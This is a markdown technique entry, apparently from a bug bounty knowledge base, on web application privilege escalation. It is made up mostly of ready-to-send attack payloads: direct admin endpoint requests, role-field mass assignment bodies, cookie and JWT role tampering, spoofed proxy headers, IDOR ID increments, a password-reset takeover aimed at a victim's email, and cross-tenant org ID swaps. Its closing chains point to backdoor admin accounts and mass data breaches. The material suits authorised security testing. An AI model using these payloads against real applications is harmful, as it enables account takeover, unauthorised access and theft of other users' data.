---
id: "privilege-escalation-webapp"
title: "Web Application Privilege Escalation"
type: "technique"
category: "web-application"
subcategory: "access-control"
tags: ["privilege-escalation", "access-control", "rbac", "role-manipulation", "horizontal", "vertical", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["idor-bola", "mass-assignment", "jwt-deep-dive", "business-logic-flaws"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Web Application Privilege Escalation

## Why App-Level Privesc Pays
OS privesc requires shell access. App privesc only requires a valid account. Every SaaS with roles (user/admin/org) has privilege escalation surface. Bounties: $5k–$30k+.

## Vertical Privilege Escalation (User → Admin)

### 1. Direct Admin Endpoint Access
```
# Authenticated as regular user, access admin endpoints directly:
GET /admin/dashboard
GET /api/admin/users
GET /admin/settings
POST /api/admin/create-user
DELETE /api/admin/user/123

# Path variations:
/admin, /administrator, /manage, /internal, /staff
/api/v1/admin/, /api/internal/, /management/

# Method switching:
# GET /admin → 403 Forbidden
# POST /admin → 200 OK (different handler, different auth check)
# PUT /admin → 200 OK
```

### 2. Role Parameter Manipulation
```
# Registration with role:
POST /api/register
{"email": "attacker@evil.com", "password": "pass", "role": "admin"}
{"email": "attacker@evil.com", "password": "pass", "is_admin": true}
{"email": "attacker@evil.com", "password": "pass", "role_id": 1}
{"email": "attacker@evil.com", "password": "pass", "permissions": ["admin"]}

# Profile update with role:
PUT /api/profile
{"name": "Attacker", "role": "admin"}
{"name": "Attacker", "group": "administrators"}

# Mass assignment — add unexpected fields:
PUT /api/users/me
{"name": "Attacker", "admin": true, "verified": true, "approved": true}
```

### 3. Function-Level Access Control
```
# Some apps check role on page load but not on API calls

# Dashboard shows "Admin Panel" link only for admins
# But the API endpoint /api/admin/export doesn't check role

# Test every API endpoint with a regular user token:
# 1. Log in as admin, capture all API calls
# 2. Log in as regular user
# 3. Replay admin API calls with regular user's session
# 4. Any that succeed = broken access control

# Automate with Burp Autorize extension
```

### 4. JWT/Token Claim Manipulation
```
# If role is stored in JWT:
# Decode → change "role": "user" to "role": "admin" → re-encode

# If role is in cookie:
Cookie: role=user → Cookie: role=admin
Cookie: role=dXNlcg== → Cookie: role=YWRtaW4= (base64)
Cookie: access_level=1 → Cookie: access_level=5

# If role is in session storage:
# Modify via browser console:
sessionStorage.setItem('role', 'admin')
localStorage.setItem('userRole', 'admin')
```

### 5. HTTP Header Bypass
```
# Some apps use headers for internal auth:
X-User-Role: admin
X-Admin: true
X-Forwarded-User: admin
X-Original-URL: /admin/dashboard
X-Rewrite-URL: /admin/dashboard

# Internal IP bypass:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1

# These headers are trusted when set by reverse proxy
# But attacker can set them directly if proxy doesn't strip them
```

## Horizontal Privilege Escalation (User A → User B)

### 6. IDOR on User Actions
```
# Access other users' data by changing IDs:
GET /api/users/123/profile → GET /api/users/124/profile
GET /api/orders/456 → GET /api/orders/457
GET /api/documents/abc → GET /api/documents/abd

# UUID/GUID enumeration:
# UUIDs aren't random if using v1 (time-based)
# Extract timestamp + MAC from UUID → predict other UUIDs
# UUIDv4 is random — but check if they leak in other API responses

# Encoded IDs:
# /api/users/MTIz → base64("123") → decode, increment, re-encode
# /api/users/7b → hex(123) → convert, increment, re-encode
```

### 7. Email/Phone as Identifier
```
# Change operations using email:
POST /api/password-reset
{"email": "victim@target.com"}  # Reset victim's password

POST /api/account/verify
{"email": "victim@target.com", "code": "000000"}  # Brute force verification

PUT /api/profile
{"email": "victim@target.com"}  # Change your email to victim's → ATO
```

### 8. Multi-Tenant Isolation Bypass
```
# SaaS apps: access data from other organizations

# Org ID manipulation:
GET /api/org/123/users → GET /api/org/124/users
X-Org-Id: 123 → X-Org-Id: 124
Cookie: org=abc → Cookie: org=def

# Subdomain tenant confusion:
# org1.target.com and org2.target.com share backend
# Use org1 session cookie on org2 subdomain
# Or: API token from org1 works on org2's API

# Invite system exploitation:
# Invite yourself to victim's organization
# Or accept an expired/revoked invite
```

## Permission Confusion

### 9. Permission Inheritance Flaws
```
# Complex RBAC often has gaps:

# Parent-child resource confusion:
# User has access to project → can they access ALL sub-resources?
# /api/project/123/settings → 200 (expected)
# /api/project/123/billing → 200 (should be admin-only!)
# /api/project/123/api-keys → 200 (should be owner-only!)

# Role hierarchy bypass:
# Viewer < Editor < Admin < Owner
# Can Viewer promote themselves to Editor?
# Can Editor create/modify Admin accounts?
PUT /api/team/members/SELF_ID
{"role": "admin"}
```

### 10. Wildcard/Glob Permission Bypass
```
# Permission: user can read /api/files/public/*
# Test: Can they read /api/files/private/* ?
# Test: Can they read /api/files/../private/secret ?

# GraphQL permission bypass:
# User can query their own data
# But can they use aliases or fragments to access others?
query {
  myData: user(id: "my_id") { email }
  theirData: user(id: "victim_id") { email }
}
```

## Deep Dig Prompts
```
Given this application with roles [describe]:
1. Map all admin/privileged endpoints (intercept admin session)
2. Replay every admin action with regular user session
3. Test role parameter in registration, profile update, and API calls
4. Check for IDOR on user IDs, org IDs, and resource IDs
5. Test JWT/cookie manipulation for role escalation
6. Check multi-tenant isolation (cross-org data access)
7. Test permission inheritance on nested resources
```

## Tools
- Burp Autorize extension (automated access control testing)
- Burp AuthMatrix (role-based access matrix)
- Custom scripts for IDOR enumeration
- Postman (API endpoint testing with different auth)

## Common Chains
- Privesc + IDOR = Access any user's data as admin
- Privesc + Data export = Mass data breach
- Privesc + User management = Persistent backdoor admin account
- Privesc + Billing = Financial impact
- Horizontal privesc + Vertical privesc = Full admin from unprivileged user
